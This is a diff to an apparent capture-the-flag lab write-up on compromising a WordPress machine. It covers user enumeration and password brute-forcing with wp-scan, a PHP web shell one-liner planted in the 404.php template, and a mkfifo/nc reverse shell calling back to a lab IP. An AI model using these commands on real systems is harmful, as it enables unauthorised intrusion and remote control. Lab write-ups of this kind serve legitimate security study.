@@ -8,7 +8,7 @@ Just a warmup, as its been a while. Actually spent most of my time working on a 
 2. A scan of the machine revealed `80`, and a random port that turned out to be SSH.
 3. On port `80` was a wordpress site. I ran `wp-scan` and got a list of users via `-e u`
 4. Feeding these users and `rockyou.txt` back into `wp-scan` (`-U <list of users> -P <path to rockyou>`) I got a password within 0.16% of rockyou for the user `c0ldd`
-5. Via this user/password, I logged into the admin portal and customised the `404.php` template with a one liner reverse shell: `<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
+5. Via this user/password, I logged into the admin portal and customised the `404.php` template with a one liner web shell: `<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`
   - with this, accessing `?p=1337&e=ls` would list files, so I had rce. I found there was `/hidden` path this way, but it didn't matter by this point.
   - the user was `www-data`, as usual. while messing with my reverse shell shenanigans, I also established step 7 at this point.
 6. Starting up `ncat.exe -nvlp 1337` on my windows machine, I caught a reverse shell via `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.154.1 1337 >/tmp/f`
